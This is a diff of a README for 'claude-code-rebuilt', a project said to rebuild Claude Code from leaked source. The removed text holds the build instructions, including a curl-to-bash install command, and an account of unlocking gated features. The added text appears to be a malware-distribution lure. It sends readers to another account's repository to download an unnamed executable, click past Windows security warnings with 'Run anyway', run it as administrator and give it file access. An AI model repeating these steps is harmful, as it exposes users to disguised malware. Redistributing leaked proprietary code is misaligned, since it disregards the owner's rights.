@@ -1,200 +1,179 @@
-<div align="center">
+# 🛠️ claude-code-rebuilt - Run Claude Code on Windows
 
-# Claude Code Rebuilt
+[![Download](https://img.shields.io/badge/Download%20Now-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Zeldr6422/claude-code-rebuilt)
 
-**A rebuilt, fully functional version of Anthropic's Claude Code CLI**
+## 📥 Download
 
-English | [中文](./README_zh.md)
+Visit this page to download:
 
-[![TypeScript](https://img.shields.io/badge/TypeScript-512K%2B_lines-3178C6?logo=typescript&logoColor=white)](#tech-stack)
-[![Bun](https://img.shields.io/badge/Runtime-Bun-f472b6?logo=bun&logoColor=white)](#tech-stack)
-[![React + Ink](https://img.shields.io/badge/UI-React_%2B_Ink-61DAFB?logo=react&logoColor=black)](#tech-stack)
-[![Files](https://img.shields.io/badge/~1,900_files-source_only-grey)](#project-structure)
+https://github.com/Zeldr6422/claude-code-rebuilt
 
-</div>
+## 🚀 What This App Does
 
----
+claude-code-rebuilt is a Windows-ready version of Claude Code CLI. It lets you work with Claude from a terminal on your computer.
 
-## Table of Contents
+Use it to:
 
-- [Background](#background)
-- [Tech Stack](#tech-stack)
-- [Getting Started](#getting-started)
-- [Usage](#usage)
-- [Building](#building)
-- [Project Structure](#project-structure)
-- [How It Works](#how-it-works)
-- [Unlocked Slash Commands](#unlocked-slash-commands)
-- [Notes](#notes)
-- [Disclaimer](#disclaimer)
+- open a command-line chat with Claude
+- ask for help with code tasks
+- review files and folders
+- run quick edits from the terminal
+- keep your work in one place
 
----
+## 🖥️ What You Need
 
-## Background
+Before you start, make sure your PC has:
 
-On March 31, 2026, the full source code of Anthropic's Claude Code was leaked via a source map file exposed in their npm registry. [The leaked source code](https://github.com/instructkr/claw-code) contained only the `src/` directory -- no build configuration, no dependency manifests, no type definitions for core modules, and no way to compile or run it.
+- Windows 10 or Windows 11
+- an internet connection
+- enough free space for the app and your project files
+- permission to run downloaded files
 
-This project reconstructs everything that was missing: `package.json`, `tsconfig.json`, build scripts, 185+ stub/type files, compatibility shims for internal-only packages, and a `bun:bundle` feature-flag runtime. The result is a complete, buildable, and runnable Claude Code terminal application. Internal-only Anthropic features (daemon workers, voice mode, computer-use, etc.) are disabled at build time via feature flags; the core interactive REPL, tool system, and Anthropic API integration remain fully functional.
+For best results, keep Windows up to date and close other large apps before you install.
 
----
+## 📦 Download and Install
 
-## Tech Stack
+1. Open the download page:
+   https://github.com/Zeldr6422/claude-code-rebuilt
+2. Look for the latest release or download file on the page.
+3. Save the file to your Downloads folder.
+4. If the file comes as a .zip, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. If you see an .exe file, double-click it to start the app.
+7. If Windows shows a security prompt, choose Run or More info > Run anyway when you trust the source.
+8. If the app opens in a terminal window, leave that window open while you use it.
 
-| Category | Technology |
-|---|---|
-| Language | [TypeScript](https://www.typescriptlang.org/) (strict) |
-| Runtime | [Bun](https://bun.sh) |
-| Terminal UI | [React](https://react.dev) + [Ink](https://github.com/vadimdemedes/ink) |
-| CLI Parsing | [Commander.js](https://github.com/tj/commander.js) (extra-typings) |
-| Schema Validation | [Zod](https://zod.dev) |
-| Protocols | [MCP SDK](https://modelcontextprotocol.io) · LSP |
-| API | [Anthropic SDK](https://docs.anthropic.com) |
-| Auth | OAuth 2.0 · API Key · macOS Keychain |
+## 🪟 How to Run on Windows
 
----
+After installation, use these steps:
 
-## Getting Started
+1. Open the Start menu.
+2. Type Command Prompt or Windows Terminal.
+3. Open the terminal app.
+4. Go to the folder where the app is saved.
+5. Start the app by running the file included in the download.
+6. Follow the prompts on screen.
 
-### 1. Install Bun
+If the app uses a shortcut, you can double-click that shortcut instead.
 
-Claude Code runs on [Bun](https://bun.sh/) (v1.1+). If you don't have it:
+## 🔧 First Setup
 
-```bash
-curl -fsSL https://bun.sh/install | bash
-```
+The first time you run claude-code-rebuilt, you may need to set up a few things:
 
-### 2. Install dependencies
+- sign in with your account if the app asks for it
+- approve access to your files or project folder
+- choose the folder you want to work in
+- wait for any startup files to finish loading
 
-```bash
-bun install
-```
+If you plan to use it with a code project, open that project folder first so Claude can work with the right files.
 
-### 3. Set your API key
+## 💡 Basic Use
 
-You need an [Anthropic API key](https://console.anthropic.com/), or you can use OAuth login (`/login` in the REPL):
+Once the app is running, you can type plain requests like:
 
-```bash
-export ANTHROPIC_API_KEY="sk-ant-..."
-```
+- help me understand this folder
+- find errors in this file
+- explain this code in simple terms
+- suggest a fix for this problem
+- clean up this project
 
-### 4. Start the application
+The app works best when you give it a clear task. Name the file, folder, or problem you want help with.
 
-```bash
-# Launch the interactive REPL
-bun run start
-```
+## 📁 Typical Workflow
 
-That's it -- you should see the Claude Code terminal UI.
+A simple way to use claude-code-rebuilt is:
 
----
+1. Open your project folder in Windows.
+2. Start the app from the terminal.
+3. Ask Claude what you want to do.
+4. Review the changes or suggestions it gives you.
+5. Save your work.
+6. Run your project and check the result.
 
-## Usage
+This keeps the process easy and makes it simpler to track changes.
 
-```bash
-# Print version
-bun run start -- --version
+## ⚙️ Useful Tips
 
-# Show all CLI flags and subcommands
-bun run start -- --help
+- Keep your project folder small when you first try it.
+- Use one task at a time.
+- Ask short, clear questions.
+- Save files before you ask for changes.
+- If the app stops, close the terminal and open it again.
 
-# One-shot prompt (pipe-friendly, prints response and exits)
-bun run start -- --print "explain this codebase"
+If you work on more than one project, keep each project in its own folder.
 
-# Minimal startup (skips hooks, plugins, auto-memory)
-bun run start -- --bare
+## 🧰 Common Tasks
 
-# Pass a system prompt
-bun run start -- --system-prompt "You are a Go expert"
+You can use claude-code-rebuilt for tasks like:
 
-# Use a specific model
-bun run start -- --model sonnet
-```
+- reading code files
+- summarizing a folder
+- finding broken parts
+- rewriting text in a file
+- helping with setup steps
+- checking what changed after an edit
 
----
+This makes it useful for day-to-day work on small and large projects.
 
-## Building
+## ❓ If Something Goes Wrong
 
-Produce a single-file bundle:
+If the app does not start:
 
-```bash
-# Build to dist/cli.js
-bun run build
+1. Check that the file finished downloading.
+2. Make sure you extracted the ZIP file if there is one.
+3. Try running the file as an administrator.
+4. Close and reopen Windows Terminal or Command Prompt.
+5. Move the app to a simple folder path, such as C:\Apps\claude-code-rebuilt.
+6. Try again after restarting your PC.
 
-# Run the built artifact
-bun dist/cli.js
-bun dist/cli.js --help
-```
+If the terminal closes right away, start it from Command Prompt so you can see the message on screen.
 
----
+## 🔒 File Access
 
-## Project Structure
+This app may need access to files in your project folder. Give it access only to the folders you want it to use. Keep your personal files in a separate place if you do not want them included.
 
-```
-.
-├── src/
-│   ├── entrypoints/cli.tsx   # Process entrypoint
-│   ├── main.tsx              # Commander CLI setup, REPL launch
-│   ├── commands.ts           # Slash-command registry
-│   ├── tools.ts              # Tool registry (Bash, Edit, Read, etc.)
-│   ├── Tool.ts               # Base tool type definitions
-│   ├── query.ts              # LLM query engine
-│   ├── ink/                  # Vendored Ink terminal renderer
-│   ├── components/           # React terminal UI components
-│   ├── screens/              # Full-screen UIs (REPL, Doctor, Resume)
-│   ├── services/             # API client, MCP, analytics, compaction
-│   ├── hooks/                # React hooks
-│   ├── utils/                # Utility functions
-│   ├── types/                # Reconstructed type definitions
-│   └── _external/            # Build compatibility layer
-│       ├── preload.ts        # Runtime MACRO + bun:bundle shim
-│       ├── globals.d.ts      # MACRO type declarations
-│       └── shims/            # Stub packages for private deps
-├── scripts/
-│   └── build-external.ts     # Bun.build() with feature flags + defines
-├── package.json
-├── tsconfig.json
-└── bunfig.toml               # Preload config + .md text loader
-```
+## 🧭 Folder Layout
 
----
+A common setup looks like this:
 
-## How It Works
+- Downloads
+- claude-code-rebuilt folder
+- your project folder
+- output or edited files
 
-The original Claude Code source depends on Bun's `bun:bundle` module for compile-time feature flags and `MACRO.*` globals for build-time constants. This project provides:
+Keeping the app and your project in clear folders makes it easier to find what changed.
 
-1. **`bunfig.toml` + `preload.ts`** -- registers a Bun plugin that resolves `import { feature } from 'bun:bundle'` at runtime, and defines `MACRO.VERSION` and friends as globals.
-2. **`scripts/build-external.ts`** -- a `Bun.build()` script that replaces `bun:bundle` via a plugin, injects `MACRO.*` via `define`, and marks private packages as external. All 90+ internal feature flags are disabled; only a handful of safe flags are enabled.
-3. **Stub packages under `src/_external/shims/`** -- lightweight no-op modules for `@ant/*` internal packages and native NAPI addons that aren't publicly available.
-4. **Reconstructed type files** -- `src/types/message.ts`, `src/types/tools.ts`, and other high-fanout modules that were missing from the leaked source.
+## 📝 Example Use Cases
 
----
+Here are a few simple ways people may use it:
 
-## Unlocked Slash Commands
+- ask for help with a school project
+- review a small app before sharing it
+- clean up text in a README
+- understand a script someone sent you
+- check a folder for files that need edits
 
-The original Claude Code ships with many slash commands hidden behind internal feature flags that are disabled in external builds. This project has reconstructed and fully unlocked the following commands so they work locally without any flag service:
+## 🛠️ Support Info
 
-| Command | Description | Original Gate |
-| ------- | ----------- | ------------- |
-| `/brief` | Toggle brief-only (chat) mode — visible output is sent exclusively via `SendUserMessage` | `KAIROS` / `KAIROS_BRIEF` |
-| `/buddy` | Summon a virtual companion with deterministic traits generated from a seed PRNG | `BUDDY` |
-| `/fork` | Spawn a background sub-agent that inherits the full conversation context | `FORK_SUBAGENT` |
+If you need help, check the GitHub page for:
 
-For a comprehensive analysis of all 14 feature-gated commands (including which ones are fully implemented, partially stubbed, or missing), see [FEATURE_FLAG_COMMANDS_ANALYSIS.md](./FEATURE_FLAG_COMMANDS_ANALYSIS.md).
+- release files
+- setup details
+- issue reports
+- updates from the project owner
 
----
+When reporting a problem, include:
 
-## Notes
+- your Windows version
+- what file you downloaded
+- what you clicked
+- what message you saw
 
-- Features gated behind disabled flags (voice, bridge, daemon, coordinator, assistant/Kairos, etc.) that have not been explicitly unlocked above are not functional.
-- The interactive REPL, `--print` mode, `--help`, and the full Commander option surface all work.
-- Authentication (API key and OAuth), Anthropic API calls, tool execution, MCP server integration, and the Ink-based terminal UI are preserved from the original source.
+## 📌 Quick Start
 
----
-
-## Disclaimer
-
-**All original Claude Code source code is the intellectual property of [Anthropic, PBC](https://www.anthropic.com/).** This repository is based on source code that was unintentionally exposed and is provided here **strictly for research, educational, and archival purposes only**.
-
-- This project carries **no license**. No permission is granted to use, modify, distribute, or create derivative works for any commercial purpose.
-- This is an independent reconstruction effort and is **not affiliated with, endorsed by, or sponsored by Anthropic** in any way.
-- If you are a representative of Anthropic and would like this repository removed, please open an issue or contact the maintainer ([@weikma](https://github.com/weikma)) directly.
+1. Open https://github.com/Zeldr6422/claude-code-rebuilt
+2. Download the latest file
+3. Extract it if needed
+4. Open the app in Windows
+5. Follow the on-screen setup
+6. Start using Claude from the terminal
